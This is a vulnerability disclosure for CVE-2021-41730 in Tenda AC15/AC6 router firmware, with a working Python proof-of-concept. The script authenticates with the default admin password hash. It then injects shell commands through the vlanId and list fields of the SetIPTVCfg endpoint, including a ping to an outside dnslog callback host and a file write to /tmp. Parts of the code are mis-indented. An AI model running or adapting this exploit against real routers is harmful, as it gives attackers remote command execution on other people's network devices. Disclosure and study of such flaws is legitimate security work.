# TENDA Authorization Remote Command Execution
**Exploit Author:**  IBULI(hsx713826@gmail.com)
</br>**Vender:** TENDA

## CVE-2021-41730 - /bin/httpd
**Firmware version:**  
AC15: <=US_AC15V1.0BR_V15.03.05.20_multi_TDE01.bin
</br>AC6: US_AC6V1.0BR_V15.03.05.16_multi_TD01.bin  
.......
</br>**Hardware Link:** https://www.tendacn.com/en/download/detail-3858.html

## The detail of vulnerability
In the httpd binary,Due to the lack of valid verification, attackers can tamper with the values of stbEn, igmpEn, iptvType, vlanId and List fields in packets to realize a series of circumvention, resulting in remote arbitrary command execution vulnerability.

#### Vulnerability trigger function
`formSetIptv()`
</br>
![image](https://github.com/IBUILI/vulnerability/blob/main/images/1.png)
####  Actual vulnerability trigger function
`sub_B0F14() / sub_B1100()`
![image](https://github.com/IBUILI/vulnerability/blob/main/images/2.png)
#### sub_B0F14()
![image](https://github.com/IBUILI/vulnerability/blob/main/images/3.png)
#### sub_B1100()
![image](https://github.com/IBUILI/vulnerability/blob/main/images/4.png)
#### Burpsuite intercept
![image](https://github.com/IBUILI/vulnerability/blob/main/images/5.png)

## POC
<sup> 


  
  
    # !/usr/bin/env python
    # -*- coding: utf-8 -*-
    import requests
  
    def POC(ip,cmd1,cmd2,pwd):
        try:
            body = {
                'username': 'admin',
                'password': pwd
            }
            headers = {
                'Host': ip,
                'Accept': '*/*',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'http://' + ip,
                'Referer': 'http://' + ip + '/login.html',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'close'
            }
            r = requests.post(url="http://" + ip + "/login/Auth",
                              data=body,
                              headers=headers,
                              allow_redirects=False )
            password = r.headers['Set-Cookie'].strip("password=").strip("; path=/")
            try:
                body = {
                    'stbEn':'1',
                    'igmpEn':'0',
                    'iptvType':'manual',
                    'vlanId':cmd1,
                    'list':cmd2 }
               headers = {
                    'Host': ip,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'http://'+ip,
                    'Referer': 'http://'+ip+'/iptv.html?random=0.5429353367490362&',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Cookie': 'password='+password,
                    'Content-Type':'application/x-www-form-urlencoded'}
               r = requests.post(url="http://" + ip + "/goform/SetIPTVCfg",
                                  data=body,
                                  headers=headers,
                                 allow_redirects=False)
                print(r.text)
           except Exception as e:
               print("[error]:", ip)
        except Exception as e:
            print("[error]:", ip)


    if __name__ == "__main__":
        ip = '192.168.0.1'
        cmd1 = '1";ping -c 5 fry8vd.dnslog.cn;echo "'
        cmd2 =  '1";echo 2>/tmp/hello3.txt;echo "'
        password = '21232f297a57a5a743894a0e4a801fc3'
        POC(ip,cmd1,cmd2,password)



</sup>


## DEMO
  [![Watch the video](https://raw.github.com/GabLeRoux/WebMole/master/ressources/WebMole_Youtube_Video.png)](https://youtu.be/lmPos_Z6jRg)
